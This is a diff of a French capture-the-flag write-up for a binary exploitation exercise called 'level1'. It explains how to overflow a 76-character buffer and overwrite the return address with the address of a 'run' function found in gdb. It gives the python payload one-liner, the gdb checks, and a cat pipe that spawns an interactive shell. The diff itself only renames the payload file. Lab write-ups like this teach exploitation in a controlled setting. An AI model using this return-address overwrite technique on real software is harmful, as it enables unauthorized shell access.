@@ -14,12 +14,12 @@ L'objectif ici est de faire overflow le buffer au dela des 76 caracteres afin de
 Pour ce faire, il faut proceder par etapes:
 > trouver l'adresse de la fonction "run" au lancement du programme a l'aide de gdb "p run" 0x8048444, \x44\x84\x04\x08 en format little-endian
 > creer un payload afin d'exploiter la faille, celui-ci contiendra 76 caracteres puis l'adresse de la fonction run:
-python -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/exploit
+python -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/level1
 > verifier si le payload fonctionne avec gdb:
 disas main
 b *main+22
-run < /tmp/exploit
+run < /tmp/level1
 x/4x $esp
 > si l'adresse de "run" se trouve bien tout en haut de la stack avant le retour du programme, nous devrions pouvoir lancer cette commande pour faire spawn un shell:
-cat /tmp/exploit - | ./level1
+cat /tmp/level1 - | ./level1
 (L'argument "-" passe a cat permet de garder l'entree standart ouverte afin de garder le shell interactif)
